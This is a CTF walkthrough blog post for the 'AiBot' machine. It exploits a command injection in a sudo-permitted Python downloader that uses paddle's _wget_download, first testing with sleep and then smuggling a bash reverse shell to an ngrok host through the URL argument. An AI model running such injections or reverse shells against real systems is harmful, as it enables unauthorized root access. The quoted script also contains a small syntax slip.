---

title: "AiBot"  
date: "2025-4-15"  
thumbnail: "/assets/img/thumbnail/Aibot.png"

---

# AiBot
---
**Challenges Difficulty: Medium**  
**Category: Machines**

## WALKTHROUGH 
This challenge is from Cybertalant 2025 ramadan nights CTF

---

First thing we got is a terminal with a user called **ttyduser** to list this user permissions use 
```bash
sudo -l
```

![image.png](/assets/img/posts/Aibot/image.png)
ttyduser can run **/usr/bin/python3 /opt/aiwget.py** with sudo 

```python
import argparse
import re
from paddle import utils

def is_valid_url(url):
    regex = re.compile(
    r'^(?:http|ftp|https)s?://',
    re.IGNORECASE,
    )
    return re.match(regex, url) is not None

def is_valid_path(path):
    return path.startswith("/tmp")

def main():
    parser = argparse.ArgumentParser(description='Download AI Model.')
    parser.add_argument('url', type=str, help='URL to download from')
    parser.add_argument('path', type=str, help='Path to save the file, must start with /tmp')
    args parser.parse_args()
    if not is_valid_url(args.url):
        raise ValueError("The URL is not valid.")
    if not is_valid_path(args.path):
        raise ValueError("The path must start with /tmp.")
    utils.download._wget_download(args.url, args.path)

if __name__ == '__main__':
    main()
```
This script requires two arguments:
1. **url**: the link to the AI Model to download
2. **path**: path to save model to and must start with /tmp

Takes the arguments directly from the user and passes them to _wget_download function
we found a cve for [utils.download._wget_download](https://nvd.nist.gov/vuln/detail/CVE-2024-0815) function

![image.png](/assets/img/posts/Aibot/image%201.png)

So we tried to do so

```
sudo /usr/bin/python3 /opt/aiwget.py "https://; sleep 10" /tmp/model
```

![image.png](/assets/img/posts/Aibot/image%202.png)

and it works so lets try to get a revere shell using ngrok

```
ngrok tcp 4444 
```

![image.png](/assets/img/posts/Aibot/image%203.png)

```
sudo /usr/bin/python3 /opt/aiwget.py "https://; bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/14455 0>&1'" /tmp/model
```

![image.png](/assets/img/posts/Aibot/image%204.png)